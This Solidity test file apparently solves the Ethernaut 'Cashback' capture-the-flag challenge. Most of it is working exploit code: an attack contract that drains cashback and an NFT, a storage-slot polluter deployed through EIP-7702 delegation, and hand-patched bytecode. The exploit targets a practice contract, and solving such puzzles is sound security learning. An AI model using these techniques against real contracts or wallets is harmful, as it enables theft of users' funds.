// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Cashback.sol";
import "node_modules/@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "node_modules/@openzeppelin/contracts/access/Ownable.sol";
import "node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "node_modules/@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "node_modules/@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

// tutorial for bytecode manipulation: https://hackernoon.com/exploiting-eip-7702-delegation-in-the-ethernaut-cashback-challenge-a-step-by-step-writeup

// creation code: 608060405260015f5f6101000a81548160ff0219169083151502179055503480156027575f5ffd5b50610bbf806100355f395ff3fe
// insertion code (length 43 bytes): 602A564495B8BD7E7B202B291258EA6E91CAD699E5C75B000000000000000000000000000000000000005B

// modified jump des bytecode using jump_offset.py from https://github.com/Maksandre/ethernaut-cashback/blob/main/scripts/jump-offset.py
// somehow the modified code contains some extra wrong 0s at the end; remove them
// 608060405234801561003a575f5ffd5b5060043610610075575f3560e01c806334b151181461007957806349f42650146100975780637bea12f5146100b55780638380edb7146100d1575b5f5ffd5b6100816100ef565b60405161008e91906107c8565b60405180910390f35b61009f61012c565b6040516100ac919061085b565b60405180910390f35b6100cf60048036038101906100ca91906108b3565b610144565b005b6100d9610789565b6040516100e6919061091d565b60405180910390f35b5f5f5f9054906101000a900460ff1615610125575f5f5f6101000a81548160ff0219169083151502179055506127109050610129565b5f90505b90565b73eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee81565b5f8390505f8173ffffffffffffffffffffffffffffffffffffffff1663e2701f4e73eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6040518263ffffffff1660e01b8152600401610196919061085b565b602060405180830381865afa1580156101b1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101d59190610960565b6127108373ffffffffffffffffffffffffffffffffffffffff1663aed4729473eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6040518263ffffffff1660e01b8152600401610225919061085b565b602060405180830381865afa158015610240573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102649190610960565b61026e91906109b8565b6102789190610a26565b90508173ffffffffffffffffffffffffffffffffffffffff1663ebc3961373eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee836040518363ffffffff1660e01b81526004016102c9929190610a56565b5f604051808303815f87803b1580156102e0575f5ffd5b505af11580156102f2573d5f5f3e3d5ffd5b505050508173ffffffffffffffffffffffffffffffffffffffff1663f242432a308561034773eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee73ffffffffffffffffffffffffffffffffffffffff16610791565b8673ffffffffffffffffffffffffffffffffffffffff1663aed4729473eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6040518263ffffffff1660e01b8152600401610394919061085b565b602060405180830381865afa1580156103af573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103d39190610960565b6040518563ffffffff1660e01b81526004016103f29493929190610abf565b5f604051808303815f87803b158015610409575f5ffd5b505af115801561041b573d5f5f3e3d5ffd5b505050505f8490508273ffffffffffffffffffffffffffffffffffffffff1663e2701f4e826040518263ffffffff1660e01b815260040161045c919061085b565b602060405180830381865afa158015610477573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061049b9190610960565b6127108473ffffffffffffffffffffffffffffffffffffffff1663aed47294846040518263ffffffff1660e01b81526004016104d7919061085b565b602060405180830381865afa1580156104f2573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105169190610960565b61052091906109b8565b61052a9190610a26565b91508273ffffffffffffffffffffffffffffffffffffffff1663ebc3961382846040518363ffffffff1660e01b8152600401610567929190610a56565b5f604051808303815f87803b15801561057e575f5ffd5b505af1158015610590573d5f5f3e3d5ffd5b505050508273ffffffffffffffffffffffffffffffffffffffff1663f242432a30866105d18573ffffffffffffffffffffffffffffffffffffffff16610791565b8773ffffffffffffffffffffffffffffffffffffffff1663aed47294876040518263ffffffff1660e01b815260040161060a919061085b565b602060405180830381865afa158015610625573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106499190610960565b6040518563ffffffff1660e01b81526004016106689493929190610abf565b5f604051808303815f87803b15801561067f575f5ffd5b505af1158015610691573d5f5f3e3d5ffd5b505050508273ffffffffffffffffffffffffffffffffffffffff166382731ebc6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156106de573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107029190610b29565b73ffffffffffffffffffffffffffffffffffffffff166342842e0e30863073ffffffffffffffffffffffffffffffffffffffff166040518463ffffffff1660e01b815260040161075493929190610b54565b5f604051808303815f87803b15801561076b575f5ffd5b505af115801561077d573d5f5f3e3d5ffd5b50505050505050505050565b5f6001905090565b5f8173ffffffffffffffffffffffffffffffffffffffff169050919050565b5f819050919050565b6107c2816107b0565b82525050565b5f6020820190506107db5f8301846107b9565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61082361081e610819846107e1565b610800565b6107e1565b9050919050565b5f61083482610809565b9050919050565b5f6108458261082a565b9050919050565b6108558161083b565b82525050565b5f60208201905061086e5f83018461084c565b92915050565b5f5ffd5b5f610882826107e1565b9050919050565b61089281610878565b811461089c575f5ffd5b50565b5f813590506108ad81610889565b92915050565b5f5f5f606084860312156108ca576108c9610874565b5b5f6108d78682870161089f565b93505060206108e88682870161089f565b92505060406108f98682870161089f565b9150509250925092565b5f8115159050919050565b61091781610903565b82525050565b5f6020820190506109305f83018461090e565b92915050565b61093f816107b0565b8114610949575f5ffd5b50565b5f8151905061095a81610936565b92915050565b5f6020828403121561097557610974610874565b5b5f6109828482850161094c565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6109c2826107b0565b91506109cd836107b0565b92508282026109db816107b0565b915082820484148315176109f2576109f161098b565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f610a30826107b0565b9150610a3b836107b0565b925082610a4b57610a4a6109f9565b5b828204905092915050565b5f604082019050610a695f83018561084c565b610a7660208301846107b9565b9392505050565b610a8681610878565b82525050565b5f82825260208201905092915050565b50565b5f610aaa5f83610a8c565b9150610ab582610a9c565b5f82019050919050565b5f60a082019050610ad25f830187610a7d565b610adf6020830186610a7d565b610aec60408301856107b9565b610af960608301846107b9565b8181036080830152610b0a81610a9f565b905095945050505050565b5f81519050610b2381610889565b92915050565b5f60208284031215610b3e57610b3d610874565b5b5f610b4b84828501610b15565b91505092915050565b5f606082019050610b675f830186610a7d565b610b746020830185610a7d565b610b8160408301846107b9565b94935050505056fea2646970667358fe1220f1fefe72608303b716d6b428735301c46d1fbfdb490406620288cafe5b7800000000000000000000000000000000000000000000000000
// this is correct:
// 608060405234801561003a575f5ffd5b5060043610610075575f3560e01c806334b151181461007957806349f42650146100975780637bea12f5146100b55780638380edb7146100d1575b5f5ffd5b6100816100ef565b60405161008e91906107c8565b60405180910390f35b61009f61012c565b6040516100ac919061085b565b60405180910390f35b6100cf60048036038101906100ca91906108b3565b610144565b005b6100d9610789565b6040516100e6919061091d565b60405180910390f35b5f5f5f9054906101000a900460ff1615610125575f5f5f6101000a81548160ff0219169083151502179055506127109050610129565b5f90505b90565b73eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee81565b5f8390505f8173ffffffffffffffffffffffffffffffffffffffff1663e2701f4e73eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6040518263ffffffff1660e01b8152600401610196919061085b565b602060405180830381865afa1580156101b1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101d59190610960565b6127108373ffffffffffffffffffffffffffffffffffffffff1663aed4729473eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6040518263ffffffff1660e01b8152600401610225919061085b565b602060405180830381865afa158015610240573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102649190610960565b61026e91906109b8565b6102789190610a26565b90508173ffffffffffffffffffffffffffffffffffffffff1663ebc3961373eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee836040518363ffffffff1660e01b81526004016102c9929190610a56565b5f604051808303815f87803b1580156102e0575f5ffd5b505af11580156102f2573d5f5f3e3d5ffd5b505050508173ffffffffffffffffffffffffffffffffffffffff1663f242432a308561034773eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee73ffffffffffffffffffffffffffffffffffffffff16610791565b8673ffffffffffffffffffffffffffffffffffffffff1663aed4729473eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6040518263ffffffff1660e01b8152600401610394919061085b565b602060405180830381865afa1580156103af573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103d39190610960565b6040518563ffffffff1660e01b81526004016103f29493929190610abf565b5f604051808303815f87803b158015610409575f5ffd5b505af115801561041b573d5f5f3e3d5ffd5b505050505f8490508273ffffffffffffffffffffffffffffffffffffffff1663e2701f4e826040518263ffffffff1660e01b815260040161045c919061085b565b602060405180830381865afa158015610477573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061049b9190610960565b6127108473ffffffffffffffffffffffffffffffffffffffff1663aed47294846040518263ffffffff1660e01b81526004016104d7919061085b565b602060405180830381865afa1580156104f2573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105169190610960565b61052091906109b8565b61052a9190610a26565b91508273ffffffffffffffffffffffffffffffffffffffff1663ebc3961382846040518363ffffffff1660e01b8152600401610567929190610a56565b5f604051808303815f87803b15801561057e575f5ffd5b505af1158015610590573d5f5f3e3d5ffd5b505050508273ffffffffffffffffffffffffffffffffffffffff1663f242432a30866105d18573ffffffffffffffffffffffffffffffffffffffff16610791565b8773ffffffffffffffffffffffffffffffffffffffff1663aed47294876040518263ffffffff1660e01b815260040161060a919061085b565b602060405180830381865afa158015610625573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106499190610960565b6040518563ffffffff1660e01b81526004016106689493929190610abf565b5f604051808303815f87803b15801561067f575f5ffd5b505af1158015610691573d5f5f3e3d5ffd5b505050508273ffffffffffffffffffffffffffffffffffffffff166382731ebc6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156106de573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107029190610b29565b73ffffffffffffffffffffffffffffffffffffffff166342842e0e30863073ffffffffffffffffffffffffffffffffffffffff166040518463ffffffff1660e01b815260040161075493929190610b54565b5f604051808303815f87803b15801561076b575f5ffd5b505af115801561077d573d5f5f3e3d5ffd5b50505050505050505050565b5f6001905090565b5f8173ffffffffffffffffffffffffffffffffffffffff169050919050565b5f819050919050565b6107c2816107b0565b82525050565b5f6020820190506107db5f8301846107b9565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61082361081e610819846107e1565b610800565b6107e1565b9050919050565b5f61083482610809565b9050919050565b5f6108458261082a565b9050919050565b6108558161083b565b82525050565b5f60208201905061086e5f83018461084c565b92915050565b5f5ffd5b5f610882826107e1565b9050919050565b61089281610878565b811461089c575f5ffd5b50565b5f813590506108ad81610889565b92915050565b5f5f5f606084860312156108ca576108c9610874565b5b5f6108d78682870161089f565b93505060206108e88682870161089f565b92505060406108f98682870161089f565b9150509250925092565b5f8115159050919050565b61091781610903565b82525050565b5f6020820190506109305f83018461090e565b92915050565b61093f816107b0565b8114610949575f5ffd5b50565b5f8151905061095a81610936565b92915050565b5f6020828403121561097557610974610874565b5b5f6109828482850161094c565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6109c2826107b0565b91506109cd836107b0565b92508282026109db816107b0565b915082820484148315176109f2576109f161098b565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f610a30826107b0565b9150610a3b836107b0565b925082610a4b57610a4a6109f9565b5b828204905092915050565b5f604082019050610a695f83018561084c565b610a7660208301846107b9565b9392505050565b610a8681610878565b82525050565b5f82825260208201905092915050565b50565b5f610aaa5f83610a8c565b9150610ab582610a9c565b5f82019050919050565b5f60a082019050610ad25f830187610a7d565b610adf6020830186610a7d565b610aec60408301856107b9565b610af960608301846107b9565b8181036080830152610b0a81610a9f565b905095945050505050565b5f81519050610b2381610889565b92915050565b5f60208284031215610b3e57610b3d610874565b5b5f610b4b84828501610b15565b91505092915050565b5f606082019050610b675f830186610a7d565b610b746020830185610a7d565b610b8160408301846107b9565b94935050505056fea2646970667358fe1220f1fefe72608303b716d6b428735301c46d1fbfdb490406620288cafe5b78b44864736f6c634300081e0033

// final: 608060405260015f5f6101000a81548160ff0219169083151502179055503480156027575f5ffd5b50610bbf806100355f395ff3fe602A564495B8BD7E7B202B291258EA6E91CAD699E5C75B000000000000000000000000000000000000005B608060405234801561003a575f5ffd5b5060043610610075575f3560e01c806334b151181461007957806349f42650146100975780637bea12f5146100b55780638380edb7146100d1575b5f5ffd5b6100816100ef565b60405161008e91906107c8565b60405180910390f35b61009f61012c565b6040516100ac919061085b565b60405180910390f35b6100cf60048036038101906100ca91906108b3565b610144565b005b6100d9610789565b6040516100e6919061091d565b60405180910390f35b5f5f5f9054906101000a900460ff1615610125575f5f5f6101000a81548160ff0219169083151502179055506127109050610129565b5f90505b90565b73eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee81565b5f8390505f8173ffffffffffffffffffffffffffffffffffffffff1663e2701f4e73eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6040518263ffffffff1660e01b8152600401610196919061085b565b602060405180830381865afa1580156101b1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101d59190610960565b6127108373ffffffffffffffffffffffffffffffffffffffff1663aed4729473eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6040518263ffffffff1660e01b8152600401610225919061085b565b602060405180830381865afa158015610240573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102649190610960565b61026e91906109b8565b6102789190610a26565b90508173ffffffffffffffffffffffffffffffffffffffff1663ebc3961373eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee836040518363ffffffff1660e01b81526004016102c9929190610a56565b5f604051808303815f87803b1580156102e0575f5ffd5b505af11580156102f2573d5f5f3e3d5ffd5b505050508173ffffffffffffffffffffffffffffffffffffffff1663f242432a308561034773eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee73ffffffffffffffffffffffffffffffffffffffff16610791565b8673ffffffffffffffffffffffffffffffffffffffff1663aed4729473eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6040518263ffffffff1660e01b8152600401610394919061085b565b602060405180830381865afa1580156103af573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103d39190610960565b6040518563ffffffff1660e01b81526004016103f29493929190610abf565b5f604051808303815f87803b158015610409575f5ffd5b505af115801561041b573d5f5f3e3d5ffd5b505050505f8490508273ffffffffffffffffffffffffffffffffffffffff1663e2701f4e826040518263ffffffff1660e01b815260040161045c919061085b565b602060405180830381865afa158015610477573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061049b9190610960565b6127108473ffffffffffffffffffffffffffffffffffffffff1663aed47294846040518263ffffffff1660e01b81526004016104d7919061085b565b602060405180830381865afa1580156104f2573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105169190610960565b61052091906109b8565b61052a9190610a26565b91508273ffffffffffffffffffffffffffffffffffffffff1663ebc3961382846040518363ffffffff1660e01b8152600401610567929190610a56565b5f604051808303815f87803b15801561057e575f5ffd5b505af1158015610590573d5f5f3e3d5ffd5b505050508273ffffffffffffffffffffffffffffffffffffffff1663f242432a30866105d18573ffffffffffffffffffffffffffffffffffffffff16610791565b8773ffffffffffffffffffffffffffffffffffffffff1663aed47294876040518263ffffffff1660e01b815260040161060a919061085b565b602060405180830381865afa158015610625573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106499190610960565b6040518563ffffffff1660e01b81526004016106689493929190610abf565b5f604051808303815f87803b15801561067f575f5ffd5b505af1158015610691573d5f5f3e3d5ffd5b505050508273ffffffffffffffffffffffffffffffffffffffff166382731ebc6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156106de573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107029190610b29565b73ffffffffffffffffffffffffffffffffffffffff166342842e0e30863073ffffffffffffffffffffffffffffffffffffffff166040518463ffffffff1660e01b815260040161075493929190610b54565b5f604051808303815f87803b15801561076b575f5ffd5b505af115801561077d573d5f5f3e3d5ffd5b50505050505050505050565b5f6001905090565b5f8173ffffffffffffffffffffffffffffffffffffffff169050919050565b5f819050919050565b6107c2816107b0565b82525050565b5f6020820190506107db5f8301846107b9565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61082361081e610819846107e1565b610800565b6107e1565b9050919050565b5f61083482610809565b9050919050565b5f6108458261082a565b9050919050565b6108558161083b565b82525050565b5f60208201905061086e5f83018461084c565b92915050565b5f5ffd5b5f610882826107e1565b9050919050565b61089281610878565b811461089c575f5ffd5b50565b5f813590506108ad81610889565b92915050565b5f5f5f606084860312156108ca576108c9610874565b5b5f6108d78682870161089f565b93505060206108e88682870161089f565b92505060406108f98682870161089f565b9150509250925092565b5f8115159050919050565b61091781610903565b82525050565b5f6020820190506109305f83018461090e565b92915050565b61093f816107b0565b8114610949575f5ffd5b50565b5f8151905061095a81610936565b92915050565b5f6020828403121561097557610974610874565b5b5f6109828482850161094c565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6109c2826107b0565b91506109cd836107b0565b92508282026109db816107b0565b915082820484148315176109f2576109f161098b565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f610a30826107b0565b9150610a3b836107b0565b925082610a4b57610a4a6109f9565b5b828204905092915050565b5f604082019050610a695f83018561084c565b610a7660208301846107b9565b9392505050565b610a8681610878565b82525050565b5f82825260208201905092915050565b50565b5f610aaa5f83610a8c565b9150610ab582610a9c565b5f82019050919050565b5f60a082019050610ad25f830187610a7d565b610adf6020830186610a7d565b610aec60408301856107b9565b610af960608301846107b9565b8181036080830152610b0a81610a9f565b905095945050505050565b5f81519050610b2381610889565b92915050565b5f60208284031215610b3e57610b3d610874565b5b5f610b4b84828501610b15565b91505092915050565b5f606082019050610b675f830186610a7d565b610b746020830185610a7d565b610b8160408301846107b9565b94935050505056fea2646970667358fe1220f1fefe72608303b716d6b428735301c46d1fbfdb490406620288cafe5b78b44864736f6c634300081e0033

contract MiddleMan {
    Currency public constant NATIVE_CURRENCY =
        Currency.wrap(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
    uint256 internal constant BASIS_POINTS = 10000;
    uint256 internal constant SUPERCASHBACK_NONCE = 10000;
    bool isFirstTime = true;

    function isUnlocked() public pure returns (bool) {
        return true;
    }

    // one NFT id has to be player; thus minting one
    function consumeNonce() public returns (uint256) {
        if (isFirstTime) {
            isFirstTime = false;
            return SUPERCASHBACK_NONCE;
        }
        return 0;
    }

    function attack(
        address prey,
        address _freedomCoin,
        address beneficiary
    ) public {
        Cashback cashback = Cashback(payable(prey));

        uint256 maxCashback = (cashback.maxCashback(NATIVE_CURRENCY) *
            BASIS_POINTS) / cashback.cashbackRates(NATIVE_CURRENCY);
        cashback.accrueCashback(NATIVE_CURRENCY, maxCashback);
        cashback.safeTransferFrom(
            address(this),
            beneficiary,
            NATIVE_CURRENCY.toId(),
            cashback.maxCashback(NATIVE_CURRENCY),
            ""
        );

        Currency freedomCoin = Currency.wrap(_freedomCoin);
        maxCashback =
            (cashback.maxCashback(freedomCoin) * BASIS_POINTS) /
            cashback.cashbackRates(freedomCoin);
        cashback.accrueCashback(freedomCoin, maxCashback);
        cashback.safeTransferFrom(
            address(this),
            beneficiary,
            freedomCoin.toId(),
            cashback.maxCashback(freedomCoin),
            ""
        );

        ERC721(cashback.superCashbackNFT()).safeTransferFrom(
            address(this),
            beneficiary,
            // see the below SuperCashbackNFT impl.
            uint256(uint160(address(this)))
        );
    }
}

// Cashback.nonce is located at
// 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba00
// + 0 from Cashback (constant & immutable are stored separately)
// + 3 from ERC1155
// and having a function modifying the first storage slot can do
contract Polluter layout at
    30832515885913550874538505337322087946323957909824905745130730710021267896835
{
    uint256 nonce;

    function pollute() public {
        nonce = 9999;
    }
}

contract SuperCashbackNFT is ERC721, Ownable {
    constructor() ERC721("Super Cashback", "SCB") Ownable(msg.sender) {}

    function mint(address receiver) public onlyOwner {
        _mint(receiver, uint256(uint160(receiver)));
    }
}

contract FreedomCoin is ERC20, Ownable {
    constructor() ERC20("Freedom Coin", "FREE") Ownable(msg.sender) {}

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract CashbackTest is Test {
    Cashback instance;
    SuperCashbackNFT superCashbackNFT;
    FreedomCoin public FREE;
    address constant NATIVE_CURRENCY =
        0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address constant BOB = address(0xB0B);
    uint256 constant NATIVE_CASHBACK_RATE = 50; // 0.5%
    uint256 constant FREE_CASHBACK_RATE = 200; // 2%
    uint256 constant NATIVE_MAX_CASHBACK = 1 ether;
    uint256 constant FREE_MAX_CASHBACK = 500 ether;
    uint256 constant BASIS_POINTS = 10000;

    function setUp() public {
        FREE = new FreedomCoin();
        superCashbackNFT = new SuperCashbackNFT();

        address[] memory cashbackCurrencies = new address[](2);
        cashbackCurrencies[0] = NATIVE_CURRENCY;
        cashbackCurrencies[1] = address(FREE);

        uint256[] memory cashbackRates = new uint256[](2);
        cashbackRates[0] = NATIVE_CASHBACK_RATE;
        cashbackRates[1] = FREE_CASHBACK_RATE;

        uint256[] memory maxCashback = new uint256[](2);
        maxCashback[0] = NATIVE_MAX_CASHBACK;
        maxCashback[1] = FREE_MAX_CASHBACK;

        instance = new Cashback(
            cashbackCurrencies,
            cashbackRates,
            maxCashback,
            address(superCashbackNFT)
        );
        superCashbackNFT.transferOwnership(address(instance));
    }

    function test() public {
        (address alice, uint256 alicePrivateKey) = makeAddrAndKey("alice");

        // 30832515885913550874538505337322087946323957909824905745130730710021267896835
        console.log(
            uint256(
                0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba00
            ) + 3
        );

        Polluter polluter = new Polluter();

        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(
            address(polluter),
            alicePrivateKey
        );

        vm.startPrank(alice, alice);
        vm.attachDelegation(signedDelegation);
        Polluter(alice).pollute();

        signedDelegation = vm.signDelegation(
            address(instance),
            alicePrivateKey
        );
        vm.attachDelegation(signedDelegation);
        assertEq(Cashback(payable(alice)).nonce(), 9999);
        Cashback(payable(alice)).payWithCashback(
            Currency.wrap(NATIVE_CURRENCY),
            alice,
            0
        );

        assertEq(
            ERC721(instance.superCashbackNFT()).ownerOf(
                uint256(uint160(alice))
            ),
            alice
        );
    }
}
